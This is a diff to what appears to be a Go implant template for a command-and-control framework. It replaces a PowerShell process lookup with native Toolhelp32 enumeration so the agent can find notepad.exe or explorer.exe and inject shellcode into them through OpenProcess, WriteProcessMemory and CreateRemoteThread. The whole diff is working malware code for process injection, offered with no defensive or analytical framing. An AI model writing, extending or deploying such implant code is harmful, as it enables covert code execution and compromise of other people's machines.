@@ -36,6 +36,10 @@ const (
 
 	// For kernel32.dll functions
 	PROCESS_ALL_ACCESS = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
+
+	// For process enumeration
+	TH32CS_SNAPPROCESS = 0x00000002
+	MAX_PATH = 260
 )
 
 var (
@@ -45,7 +49,48 @@ var (
 	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
 	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
 	procVirtualProtectEx = kernel32.NewProc("VirtualProtectEx")
+	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
+	procProcess32First = kernel32.NewProc("Process32FirstW")
+	procProcess32Next = kernel32.NewProc("Process32NextW")
 )
+
+// PROCESSENTRY32 structure for process enumeration
+type PROCESSENTRY32 struct {
+	Size            uint32
+	Usage           uint32
+	ProcessID       uint32
+	DefaultHeapID   uintptr
+	ModuleID        uint32
+	Threads         uint32
+	ParentProcessID uint32
+	PriClassBase    int32
+	Flags           uint32
+	ExeFile         [MAX_PATH]uint16
+}
+
+func createToolhelp32Snapshot(flags uint32, processID uint32) uintptr {
+	ret, _, _ := procCreateToolhelp32Snapshot.Call(
+		uintptr(flags),
+		uintptr(processID),
+	)
+	return ret
+}
+
+func process32First(snapshot uintptr, pe *PROCESSENTRY32) bool {
+	ret, _, _ := procProcess32First.Call(
+		snapshot,
+		uintptr(unsafe.Pointer(pe)),
+	)
+	return ret != 0
+}
+
+func process32Next(snapshot uintptr, pe *PROCESSENTRY32) bool {
+	ret, _, _ := procProcess32Next.Call(
+		snapshot,
+		uintptr(unsafe.Pointer(pe)),
+	)
+	return ret != 0
+}
 
 func openProcess(desiredAccess uint32, inheritHandle int32, processId uint32) uintptr {
 	ret, _, _ := procOpenProcess.Call(
@@ -706,23 +751,42 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_PROCESS_ID_FUNC}(processName string) (u
 		return 0, fmt.Errorf("process injection only supported on Windows")
 	}
 
-	cmd := exec.Command("powershell", "-Command", fmt.Sprintf("Get-Process -Name %s -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id", processName))
-	output, err := cmd.Output()
-	if err != nil {
-		return 0, fmt.Errorf("failed to get process ID: %v", err)
+	// Convert process name to lowercase for comparison
+	processName = strings.ToLower(processName)
+
+	// Create a snapshot of all processes in the system
+	snapshot := createToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+	if snapshot == 0 {
+		return 0, fmt.Errorf("failed to create process snapshot")
+	}
+	defer func() {
+		syscall.CloseHandle(syscall.Handle(snapshot))
+	}()
+
+	// Initialize the PROCESSENTRY32 structure
+	var pe PROCESSENTRY32
+	pe.Size = uint32(unsafe.Sizeof(pe))
+
+	// Get the first process
+	if !process32First(snapshot, &pe) {
+		return 0, fmt.Errorf("failed to get first process")
 	}
 
-	processIDStr := strings.TrimSpace(string(output))
-	if processIDStr == "" {
-		return 0, fmt.Errorf("process %s not found", processName)
+	// Iterate through all processes
+	for {
+		// Convert the wide string to a regular string for comparison
+		exeName := syscall.UTF16ToString(pe.ExeFile[:])
+		if strings.ToLower(exeName) == processName || strings.ToLower(strings.TrimSuffix(exeName, ".exe")) == processName {
+			return pe.ProcessID, nil
+		}
+
+		// Get the next process
+		if !process32Next(snapshot, &pe) {
+			break
+		}
 	}
 
-	pid, err := strconv.ParseUint(processIDStr, 10, 32)
-	if err != nil {
-		return 0, fmt.Errorf("failed to parse process ID: %v", err)
-	}
-
-	return uint32(pid), nil
+	return 0, fmt.Errorf("process %s not found", processName)
 }
 
 func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_SHELLCODE_FUNC}(shellcode []byte) string {
@@ -732,12 +796,12 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_SHELLCODE_FUNC}(shellcode []byte) st
 	}
 
 	// Get target process ID (try notepad.exe first, then explorer.exe as fallback)
-	pid, err := a.{AGENT_GET_PROCESS_ID_FUNC}("notepad")
+	pid, err := a.{AGENT_GET_PROCESS_ID_FUNC}("notepad.exe")
 	targetProcess := "notepad.exe"
 
 	if err != nil {
 		// If notepad.exe is not available, try explorer.exe
-		pid, err = a.{AGENT_GET_PROCESS_ID_FUNC}("explorer")
+		pid, err = a.{AGENT_GET_PROCESS_ID_FUNC}("explorer.exe")
 		if err != nil {
 			return fmt.Sprintf("[ERROR] Could not find notepad.exe or explorer.exe: %v", err)
 		}
